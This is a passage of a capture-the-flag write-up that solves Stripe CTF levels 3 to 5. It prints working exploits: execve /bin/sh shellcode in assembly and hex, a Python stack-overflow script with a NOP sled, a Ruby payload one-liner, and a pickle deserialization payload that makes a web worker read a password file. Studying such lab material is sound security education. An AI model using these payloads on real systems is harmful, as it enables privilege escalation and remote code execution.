+<div class="highlight"><pre><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">p</span> <span class="p">(</span><span class="mh">0xffbffa6c</span> <span class="o">-</span> <span class="mh">0xffbffa00</span><span class="p">)</span><span class="o">/</span><span class="mi">4</span>
+    <span class="mi">27</span>
+</pre></div>
+
+
+<p>So running an argument such as <em>/level/level03 -27 foo</em> calls <strong>fns[-27]</strong> which is <strong>&amp;fns-27</strong> times the size of the pointer.</p>
+<p>4) We assign <strong>buf</strong> to a shellcode that will spawn the privileged terminal using the function <strong>run</strong>, which is at:</p>
+<div class="highlight"><pre><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">p</span> <span class="o">&amp;</span><span class="n">run</span>
+  <span class="p">(</span><span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">))</span> <span class="mh">0x80484ac</span>
+</pre></div>
+
+
+<p>5) Stripe's machines were <a href="http://en.wikipedia.org/wiki/Endianness">little-endian</a> so the address of <strong>run</strong> is <strong>\xac\x84\x04\x08</strong>. We write the memory location of <strong>&amp;run</strong> into <strong>buf</strong>, since <strong>buf</strong> is just a <code>strcpy</code> of the second argument. In the end, we want to call:</p>
+<div class="highlight"><pre><span class="err">$</span> <span class="n">run</span><span class="p">(</span><span class="err">&#39;\</span><span class="n">xac</span><span class="err">\</span><span class="n">x84</span><span class="err">\</span><span class="n">x04</span><span class="err">\</span><span class="n">x08</span><span class="err">&#39;</span><span class="p">);</span>
+</pre></div>
+
+
+<ol>
+<li>Running it with the length  of the directory (remember that the function pointer must start on a multiple of 4 characters) gives our password:</li>
+</ol>
+<div class="highlight"><pre><span class="err">$</span> <span class="o">/</span><span class="n">levels</span><span class="o">/</span><span class="n">level03</span> <span class="o">-</span><span class="mi">21</span> <span class="s">&quot;cat /home/level03/.password $(printf &#39;</span><span class="se">\xac\x84\x04\x08</span><span class="s">&#39;)</span>
+</pre></div>
+
+
+<hr />
+<h2>Level 4: Classic Stack Overflow</h2>
+<p>Level 4 was a Stack Overflow problem, which is beautiful. Once again we get a <strong>setuid</strong> binary, together with the following code:</p>
+<div class="highlight"><pre><span class="kt">void</span> <span class="nf">fun</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
+  <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Usage: ./level04 STRING&quot;</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n">fun</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Oh no! That didn&#39;t work!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<p>In this challenge, the input string is received by the function <strong>fun</strong>, and then it will be copied to the buffer. Since <code>strcp</code> does not do bound checking, if our string is larger than 1024 characters, it will keep copying until it reaches a null byte (0x00).  This  <a href="http://phrack.org/issues/49/14.html#article">overflows the stack</a> and  makes it possible to rewrite the <strong>function return address</strong>.</p>
+<p>The input for the <strong>fun</strong> function is going to be  1024 bytes (which starts at <strong>&amp;buf</strong>) with several <a href="http://en.wikipedia.org/wiki/NOP">NOPs</a> plus the shellcode. The overflowed bytes have pointers to the address of <strong>buf</strong> (<strong>&amp;buf</strong>). We use NOPs because the system uses stack randomization. If <strong>&amp;buf</strong> points to any of the NOPs, the shellcode will be executed.</p>
+<h3>Yet Another Shellcode Introduction</h3>
+<p>When we write shellcode, we can do it directly in Assembly, or we can write it in C and then disassemble it gdb and objdump. The second option is more prone to errors.</p>
+<p>Let's write the simplest shellcode we can think of, which simple spawns a shell:</p>
+<div class="highlight"><pre><span class="cp">#include &lt;stdlib.h&gt;</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">array</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+  <span class="n">array</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="s">&quot;/bin/sh&quot;</span><span class="p">;</span>
+  <span class="n">array</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+  <span class="n">execve</span><span class="p">(</span><span class="n">array</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">array</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+  <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<p>With  a Makefile (I love having Makefile for anything I compile in C):</p>
+<div class="highlight"><pre><span class="n">shell</span><span class="o">:</span> <span class="n">simplest_shellcode</span><span class="o">.</span><span class="na">c</span>
+    <span class="n">gcc</span> <span class="o">-</span><span class="kd">static</span> <span class="o">-</span><span class="n">g</span> <span class="o">-</span><span class="n">o</span> <span class="n">shell</span> <span class="n">simplest_shellcode</span><span class="o">.</span><span class="na">c</span>
+</pre></div>
+
+
+<p>Running <strong>make</strong> will give our executable <strong>shell</strong>.  Now, let's fire up <strong>gdb</strong>:</p>
+<div class="highlight"><pre><span class="err">$</span> <span class="nx">gdb</span> <span class="nx">shell</span>
+<span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="nx">disas</span> <span class="nx">main</span>
+<span class="nb">Dump</span> <span class="nx">of</span> <span class="nx">assembler</span> <span class="nb">code</span> <span class="nb">for</span> <span class="nx">function</span> <span class="nx">main</span><span class="p">:</span>
+   <span class="mh">0x00000000004004d0</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span> <span class="nb">push</span>   <span class="o">%</span><span class="nx">rbp</span>
+   <span class="mh">0x00000000004004d1</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">:</span> <span class="nx">mov</span>    <span class="o">%</span><span class="nx">rsp</span><span class="p">,</span><span class="o">%</span><span class="nx">rbp</span>
+   <span class="mh">0x00000000004004d4</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">:</span> <span class="nb">sub</span>    <span class="err">$</span><span class="mh">0x10</span><span class="p">,</span><span class="o">%</span><span class="nx">rsp</span>
+   <span class="mh">0x00000000004004d8</span> <span class="o">&lt;+</span><span class="mi">8</span><span class="o">&gt;</span><span class="p">:</span> <span class="nx">movq</span>   <span class="err">$</span><span class="mh">0x482be4</span><span class="p">,</span><span class="o">-</span><span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="nx">rbp</span><span class="p">)</span>
+   <span class="mh">0x00000000004004e0</span> <span class="o">&lt;+</span><span class="mi">16</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nx">movq</span>   <span class="err">$</span><span class="mh">0x0</span><span class="p">,</span><span class="o">-</span><span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="nx">rbp</span><span class="p">)</span>
+   <span class="mh">0x00000000004004e8</span> <span class="o">&lt;+</span><span class="mi">24</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nx">mov</span>    <span class="o">-</span><span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="nx">rbp</span><span class="p">),</span><span class="o">%</span><span class="nx">rax</span>
+   <span class="mh">0x00000000004004ec</span> <span class="o">&lt;+</span><span class="mi">28</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nx">lea</span>    <span class="o">-</span><span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="nx">rbp</span><span class="p">),</span><span class="o">%</span><span class="nx">rcx</span>
+   <span class="mh">0x00000000004004f0</span> <span class="o">&lt;+</span><span class="mi">32</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nx">mov</span>    <span class="err">$</span><span class="mh">0x0</span><span class="p">,</span><span class="o">%</span><span class="nx">edx</span>
+   <span class="mh">0x00000000004004f5</span> <span class="o">&lt;+</span><span class="mi">37</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nx">mov</span>    <span class="o">%</span><span class="nx">rcx</span><span class="p">,</span><span class="o">%</span><span class="nx">rsi</span>
+   <span class="mh">0x00000000004004f8</span> <span class="o">&lt;+</span><span class="mi">40</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nx">mov</span>    <span class="o">%</span><span class="nx">rax</span><span class="p">,</span><span class="o">%</span><span class="nx">rdi</span>
+   <span class="mh">0x00000000004004fb</span> <span class="o">&lt;+</span><span class="mi">43</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nx">callq</span>  <span class="mh">0x40c540</span> <span class="o">&lt;</span><span class="nx">execve</span><span class="o">&gt;</span>
+   <span class="mh">0x0000000000400500</span> <span class="o">&lt;+</span><span class="mi">48</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nx">mov</span>    <span class="err">$</span><span class="mh">0x0</span><span class="p">,</span><span class="o">%</span><span class="nx">edi</span>
+   <span class="mh">0x0000000000400505</span> <span class="o">&lt;+</span><span class="mi">53</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nx">callq</span>  <span class="mh">0x400e60</span> <span class="o">&lt;</span><span class="nx">exit</span><span class="o">&gt;</span>
+<span class="nb">End</span> <span class="nx">of</span> <span class="nx">assembler</span> <span class="nx">dump.</span>
+</pre></div>
+
+
+<p>The first line is updating the frame stack pointer (<strong>%rsp</strong>), moving it to the top of the stack:</p>
+<div class="highlight"><pre><span class="mh">0x00000000004004d0</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span>    <span class="n">push</span>   <span class="o">%</span><span class="n">rbp</span>
+<span class="mh">0x00000000004004d1</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;:</span>    <span class="n">mov</span>    <span class="o">%</span><span class="n">rsp</span><span class="p">,</span><span class="o">%</span><span class="n">rbp</span>
+</pre></div>
+
+
+<p>Then it subtracts 16 bytes from <strong>%rsp</strong>, with 8 bytes of padding:</p>
+<div class="highlight"><pre><span class="mh">0x00000000004004d4</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;:</span>    <span class="n">sub</span>    <span class="err">$</span><span class="mh">0x10</span><span class="p">,</span><span class="o">%</span><span class="n">rsp</span>
+</pre></div>
+
+
+<p>We see this address <strong>0x482be4</strong> being moved to <strong>%rsp</strong>:</p>
+<div class="highlight"><pre><span class="mh">0x00000000004004d8</span> <span class="o">&lt;+</span><span class="mi">8</span><span class="o">&gt;:</span>    <span class="n">movq</span>   <span class="err">$</span><span class="mh">0x482be4</span><span class="p">,</span><span class="o">-</span><span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="n">rbp</span><span class="p">)</span>
+</pre></div>
+
+
+<p>It should be a pointer to <code>/bin/sh</code>, but we can be sure by just asking gdb:</p>
+<div class="highlight"><pre><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">1</span><span class="n">s</span> <span class="mh">0x482be4</span>
+<span class="mh">0x482be4</span><span class="o">:</span>    <span class="s">&quot;/bin/sh&quot;</span>
+</pre></div>
+
+
+<p>After that, <strong>NULL</strong> is pushed in:</p>
+<div class="highlight"><pre><span class="mh">0x00000000004004f0</span> <span class="o">&lt;+</span><span class="mi">32</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="err">$</span><span class="mh">0x0</span><span class="p">,</span><span class="o">%</span><span class="n">edx</span>
+</pre></div>
+
+
+<p>Finally, <strong>execve</strong> is executed:</p>
+<div class="highlight"><pre><span class="mh">0x00000000004004fb</span> <span class="o">&lt;+</span><span class="mi">43</span><span class="o">&gt;</span><span class="p">:</span>   <span class="nx">callq</span>  <span class="mh">0x40c540</span> <span class="o">&lt;</span><span class="nx">execve</span><span class="o">&gt;</span>
+</pre></div>
+
+
+<h3>Writing the Shellcode in Assembly</h3>
+<p>Now we are able to reproduce the code in Assembly. This is important: Stripe's machine were 32-bit, and the Assembly instructions are different from 64-bit.</p>
+<p>For instance,  the 64-bit shellcode I showed <a href="http://bt3gl.github.io/smashing-the-stack-for-fun-or-wargames-narnia-0-4.html">here</a> will be slightly different, with a <strong>l</strong> added to the words. In 32-bit machines we can write:</p>
+<div class="highlight"><pre><span class="na">.text</span>
+<span class="na">.globl</span> <span class="no">_start</span>
+
+<span class="nl">_start:</span>
+  <span class="nf">xorl</span> <span class="nv">%eax</span><span class="p">,</span> <span class="nv">%eax</span>     <span class="err">/</span><span class="p">*</span> <span class="no">make</span> <span class="no">eax</span> <span class="no">equal</span> <span class="no">to</span> <span class="mi">0</span><span class="p">*</span><span class="err">/</span>
+  <span class="nf">pushl</span> <span class="nv">%eax</span>          <span class="err">/</span><span class="p">*</span> <span class="no">pushes</span> <span class="no">null</span><span class="p">*</span><span class="err">/</span>
+  <span class="nf">pushl</span> <span class="no">$0x68732f2f</span>   <span class="err">/</span><span class="p">*</span> <span class="no">push</span> <span class="err">//</span><span class="no">sh</span> <span class="p">*</span><span class="err">/</span>
+  <span class="nf">pushl</span> <span class="no">$0x6e69622f</span>   <span class="err">/</span><span class="p">*</span> <span class="no">push</span> <span class="err">/</span><span class="no">bin</span> <span class="p">*</span><span class="err">/</span>
+  <span class="nf">movl</span>  <span class="nv">%esp</span><span class="p">,</span> <span class="nv">%ebx</span>    <span class="err">/</span><span class="p">*</span> <span class="no">store</span> <span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span> <span class="p">*</span><span class="err">/</span>
+  <span class="nf">pushl</span> <span class="nv">%eax</span>          <span class="err">/</span><span class="p">*</span> <span class="no">use</span> <span class="no">null</span><span class="p">*</span><span class="err">/</span>
+  <span class="nf">pushl</span> <span class="nv">%ebx</span>          <span class="err">/</span><span class="p">*</span> <span class="no">use</span> <span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="p">*</span><span class="err">/</span>
+  <span class="nf">movl</span>  <span class="nv">%esp</span><span class="p">,</span> <span class="nv">%ecx</span>    <span class="err">/</span><span class="p">*</span> <span class="no">wrutes</span> <span class="no">array</span> <span class="p">*</span><span class="err">/</span>
+  <span class="nf">xorl</span>  <span class="nv">%edx</span><span class="p">,</span> <span class="nv">%edx</span>    <span class="err">/</span><span class="p">*</span> <span class="no">xor</span> <span class="no">to</span> <span class="no">make</span> <span class="no">edx</span> <span class="no">equal</span> <span class="no">to</span> <span class="mi">0</span> <span class="p">*</span><span class="err">/</span>
+  <span class="nf">movb</span>  <span class="no">$0xb</span><span class="p">,</span> <span class="nv">%al</span>     <span class="err">/</span><span class="p">*</span> <span class="no">execve</span> <span class="no">system</span> <span class="no">call</span> <span class="c">#11  */</span>
+  <span class="nf">int</span> <span class="no">$0x80</span>           <span class="err">/</span><span class="p">*</span> <span class="no">make</span> <span class="no">an</span> <span class="no">interrupt</span> <span class="p">*</span><span class="err">/</span>
+</pre></div>
+
+
+<p>To assemble and link this in a 32-bits machine you do:</p>
+<div class="highlight"><pre><span class="err">$</span> <span class="n">as</span>  <span class="o">-</span><span class="n">o</span> <span class="n">shell</span><span class="p">.</span><span class="n">o</span>   <span class="n">shell</span><span class="p">.</span><span class="n">s</span>
+<span class="err">$</span> <span class="n">ld</span> <span class="o">-</span><span class="n">m</span> <span class="o">-</span><span class="n">o</span> <span class="n">shell</span> <span class="n">shell</span><span class="p">.</span><span class="n">o</span>
+</pre></div>
+
+
+<p>However, in a 64-machine you need to:</p>
+<ol>
+<li>Add <strong>.code32</strong> in the top of the Assembly code.</li>
+<li>Assemble with the --32 flag</li>
+<li>Link with the -m elf_i386 flag</li>
+</ol>
+<p>Resulting on:</p>
+<div class="highlight"><pre><span class="err">$</span> <span class="n">as</span> <span class="o">--</span><span class="mi">32</span> <span class="o">-</span><span class="n">o</span> <span class="n">shell</span><span class="p">.</span><span class="n">o</span>   <span class="n">shell</span><span class="p">.</span><span class="n">s</span>
+<span class="err">$</span> <span class="n">ld</span> <span class="o">-</span><span class="n">m</span> <span class="n">elf_i386</span> <span class="o">-</span><span class="n">o</span> <span class="n">shell</span> <span class="n">shell</span><span class="p">.</span><span class="n">o</span>
+</pre></div>
+
+
+<p>Now, the last step is get the executable <strong>shell</strong> in hexadecimal so we have the instructions for the shellcode. We use <strong>objdump</strong>:</p>
+<div class="highlight"><pre><span class="err">$</span> <span class="nx">objdump</span> <span class="na">-d</span> <span class="nx">shell</span>
+<span class="nx">shell</span><span class="p">:</span>     <span class="nb">file</span> <span class="nb">format</span> <span class="nx">elf32</span><span class="na">-i386</span>
+<span class="nx">Disassembly</span> <span class="nx">of</span> <span class="nx">section</span> <span class="bp">.</span><span class="nx">text</span><span class="p">:</span>
+<span class="mi">08048054</span> <span class="o">&lt;</span><span class="nx">_start</span><span class="o">&gt;</span><span class="p">:</span>
+ <span class="mi">8048054</span><span class="p">:</span>   <span class="mi">31</span> <span class="nx">c0</span>                   <span class="nx">xor</span>    <span class="o">%</span><span class="nx">eax</span><span class="p">,</span><span class="o">%</span><span class="nx">eax</span>
+ <span class="mi">8048056</span><span class="p">:</span>   <span class="mi">50</span>                      <span class="nb">push</span>   <span class="o">%</span><span class="nx">eax</span>
+ <span class="mi">8048057</span><span class="p">:</span>   <span class="mi">68</span> <span class="mi">2</span><span class="nb">f</span> <span class="mi">2</span><span class="nb">f</span> <span class="mi">73</span> <span class="mi">68</span>          <span class="nb">push</span>   <span class="err">$</span><span class="mh">0x68732f2f</span>
+ <span class="mi">804805</span><span class="nx">c</span><span class="p">:</span>   <span class="mi">68</span> <span class="mi">2</span><span class="nb">f</span> <span class="mi">62</span> <span class="mi">69</span> <span class="mi">6</span><span class="nx">e</span>          <span class="nb">push</span>   <span class="err">$</span><span class="mh">0x6e69622f</span>
+ <span class="mi">8048061</span><span class="p">:</span>   <span class="mi">89</span> <span class="nx">e3</span>                   <span class="nx">mov</span>    <span class="o">%</span><span class="nx">esp</span><span class="p">,</span><span class="o">%</span><span class="nx">ebx</span>
+ <span class="mi">8048063</span><span class="p">:</span>   <span class="mi">50</span>                      <span class="nb">push</span>   <span class="o">%</span><span class="nx">eax</span>
+ <span class="mi">8048064</span><span class="p">:</span>   <span class="mi">53</span>                      <span class="nb">push</span>   <span class="o">%</span><span class="nx">ebx</span>
+ <span class="mi">8048065</span><span class="p">:</span>   <span class="mi">89</span> <span class="nx">e1</span>                   <span class="nx">mov</span>    <span class="o">%</span><span class="nx">esp</span><span class="p">,</span><span class="o">%</span><span class="nx">ecx</span>
+ <span class="mi">8048067</span><span class="p">:</span>   <span class="mi">31</span> <span class="nx">d2</span>                   <span class="nx">xor</span>    <span class="o">%</span><span class="nx">edx</span><span class="p">,</span><span class="o">%</span><span class="nx">edx</span>
+ <span class="mi">8048069</span><span class="p">:</span>   <span class="nx">b0</span> <span class="mi">0</span><span class="nx">b</span>                   <span class="nx">mov</span>    <span class="err">$</span><span class="mh">0xb</span><span class="p">,</span><span class="o">%</span><span class="nx">al</span>
+ <span class="mi">804806</span><span class="nx">b</span><span class="p">:</span>   <span class="nx">cd</span> <span class="mi">80</span>                   <span class="nx">int</span>    <span class="err">$</span><span class="mh">0x80</span>
+</pre></div>
+
+
+<p>Which the little-endian representation is:</p>
+<div class="highlight"><pre><span class="err">\</span><span class="n">x31</span><span class="err">\</span><span class="n">xc0</span><span class="err">\</span><span class="n">x50</span><span class="err">\</span><span class="n">x68</span><span class="err">\</span><span class="n">x2f</span><span class="err">\</span><span class="n">x2f</span><span class="err">\</span><span class="n">x73</span><span class="err">\</span><span class="n">x68</span><span class="err">\</span><span class="n">x68</span><span class="err">\</span><span class="n">x2f</span><span class="err">\</span><span class="n">x62</span><span class="err">\</span><span class="n">x69</span><span class="err">\</span><span class="n">x6e</span><span class="err">\</span><span class="n">x89</span><span class="err">\</span><span class="n">xe3</span><span class="err">\</span><span class="n">x50</span><span class="err">\</span><span class="n">x53</span><span class="err">\</span><span class="n">x89</span><span class="err">\</span><span class="n">xe1</span><span class="err">\</span><span class="n">x31</span><span class="err">\</span><span class="n">xd2</span><span class="err">\</span><span class="n">xb0</span><span class="err">\</span><span class="n">x0b</span><span class="err">\</span><span class="n">xcd</span><span class="err">\</span><span class="n">x80</span>
+</pre></div>
+
+
+<h3>Solving the Problem</h3>
+<p>Now, all we need to do is write a snippet in any language which takes that shellcode, some NOPs and overflow the stack of hte <em>level04</em> binary.</p>
+<p>We write the exploit in Python:</p>
+<div class="highlight"><pre><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">subprocess</span>
+
+<span class="n">STACK</span> <span class="o">=</span> <span class="mh">0x0804857b</span>
+<span class="n">NOP</span> <span class="o">=</span> \<span class="n">x90</span>
+<span class="n">SHELLCODE</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80</span><span class="s">&quot;</span>
+<span class="n">EXPLOIT</span> <span class="o">=</span> <span class="n">NOP</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1024</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">SHELLCODE</span><span class="p">))</span> <span class="o">+</span> <span class="n">SHELLCODE</span>
+
+<span class="n">stack_ptr</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;I&quot;</span><span class="p">,</span> <span class="n">STACK</span><span class="p">)</span> <span class="o">*</span> <span class="mi">500</span>
+<span class="n">array</span> <span class="o">=</span> <span class="s">&quot;</span><span class="si">%s%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">EXPLOIT</span><span class="p">,</span> <span class="n">stack_ptr</span><span class="p">)</span>
+
+<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+  <span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">([</span><span class="s">&quot;/levels/level04&quot;</span><span class="p">,</span> <span class="n">array</span><span class="p">])</span>
+</pre></div>
+
+
+<p>This solution is possible due the <a href="https://docs.python.org/2/library/struct.html">struct</a> module, which performs conversion between Python and C values, and the <a href="https://docs.python.org/2/library/subprocess.html">subprocess</a> module, which allows you to spwn new processes. The <strong>struct.pack</strong> method returns a string containing the values packet in the specified format (where <strong>&lt;</strong> means little-endian and <strong>I</strong> is unsigned int).</p>
+<p>A <a href="https://github.com/stripe-ctf">one-line solution in Ruby</a>, was given by Stripe and it's worth to mention:</p>
+<div class="highlight"><pre><span class="err">$</span><span class="p">(</span><span class="n">ruby</span> <span class="o">-</span><span class="n">e</span> <span class="err">&#39;</span><span class="n">print</span> <span class="s">&quot;</span><span class="se">\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23\x41\x41\x41\x41\x42\x42\x42\x42</span><span class="s">&quot;</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span><span class="o">*</span><span class="mi">987</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\x7b\x85\x04\x08</span><span class="s">&quot;</span><span class="err">&#39;</span><span class="p">)</span>
+</pre></div>
+
+
+<hr />
+<h2>Level 5:  Unpickle exploit</h2>
+<p>The fifth level is an uppercasing <strong>web service</strong> written in Python, which is split into a HTTP and a worker queue part.</p>
+<p>In this service, a request can be sent  with:</p>
+<div class="highlight"><pre><span class="err">$</span> <span class="n">curl</span> <span class="n">localhost</span><span class="o">:</span><span class="mi">9020</span> <span class="o">-</span><span class="n">d</span> <span class="err">&#39;</span><span class="n">banana</span><span class="err">&#39;</span>
+<span class="p">{</span>
+    <span class="s">&quot;processing_time&quot;</span><span class="o">:</span> <span class="mf">5.0037501611238511e-06</span><span class="p">,</span>
+    <span class="s">&quot;queue_time&quot;</span><span class="o">:</span> <span class="mf">0.4377421910476061</span><span class="p">,</span>
+    <span class="s">&quot;result&quot;</span><span class="o">:</span> <span class="s">&quot;BANANA&quot;</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<p>After inspecting the code, we concentrate in the suspicious regex in the <strong>deserialize</strong> function with the unsafe module <a href="https://docs.python.org/2/library/pickle.html">pickle</a>:</p>
+<div class="highlight"><pre><span class="k">def</span> <span class="nf">deserialize</span><span class="p">(</span><span class="n">serialized</span><span class="p">):</span>
+    <span class="n">logger</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s">&#39;Deserializing: </span><span class="si">%r</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">serialized</span><span class="p">)</span>
+    <span class="n">parser</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s">&#39;^type: (.*?); data: (.*?); job: (.*?)$&#39;</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">DOTALL</span><span class="p">)</span>
+    <span class="n">match</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="n">serialized</span><span class="p">)</span>
+    <span class="n">direction</span> <span class="o">=</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+    <span class="n">job</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">direction</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">job</span>
+</pre></div>
+
+
+<p>This is used later in the <strong>serialize</strong> function:</p>
+<div class="highlight"><pre><span class="nd">@staticmethod</span>
+<span class="k">def</span> <span class="nf">serialize</span><span class="p">(</span><span class="n">direction</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">job</span><span class="p">):</span>
+    <span class="n">serialized</span> <span class="o">=</span> <span class="s">&quot;&quot;&quot;type: </span><span class="si">%s</span><span class="s">; data: </span><span class="si">%s</span><span class="s">; job: </span><span class="si">%s</span><span class="s">&quot;&quot;&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">direction</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">job</span><span class="p">))</span>
+    <span class="n">logger</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s">&#39;Serialized to: </span><span class="si">%r</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">serialized</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">serialized</span>
+</pre></div>
+
+
+<p>The program serializes jobs with pickle, and it sends them to a series of workers to deserialize and process the job. Once again, the attack surfaces is in the user input, which is not properly sanitized here. This function allows arbitrary data to  be sent to <strong>; job</strong>.</p>
+<p>We can exploit it by making the serialization code execute arbitrary commands . All we need to do supply a string that, such as <strong>; job: <pickled>"</strong>, that when unpickled, runs some Python code that will give us the password. A great module for this is <a href="https://docs.python.org/2/library/os.html#os.system">Python's os.system</a>, which executes a command in a subshell.</p>
+<p>All we need to do is send a string to the http service, serializing  the string to a file. The worker will then pick up this file and execute the code we sent.</p>
+<p>An example of  exploit in Python:</p>
+<div class="highlight"><pre><span class="kn">import</span> <span class="nn">pickle</span><span class="o">,</span> <span class="nn">os</span>
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">&#39;localhost:9020&#39;</span>
+
+<span class="n">os</span><span class="o">.</span><span class="n">execve</span><span class="p">(</span><span class="s">&quot;/usr/bin/curl&quot;</span><span class="p">,</span> <span class="p">[</span><span class="s">&#39;&#39;</span><span class="p">,</span> <span class="n">HOST</span><span class="p">,</span> <span class="s">&#39;-d&#39;</span><span class="p">,</span> \
+    <span class="s">&quot;bla; job: cos</span><span class="se">\n</span><span class="s">system</span><span class="se">\n</span><span class="s">(S&#39;cat /home/level05/.password </span><span class="se">\</span>
+<span class="s">    &gt; /tmp/pass&#39;</span><span class="se">\n</span><span class="s">tR.&quot;</span><span class="p">],</span> <span class="p">{})</span>
+</pre></div>
+
+
+<hr />
+<h2>Level 6: Timing Attack on Fork System Call</h2>
+<p>And we reach the sixth level! The goal in this level is to read the password from <em>/home/the-flag/.password</em>. To complete this  challenge, another <strong>setuid</strong> binary  is given, which can be used to guess the password:</p>
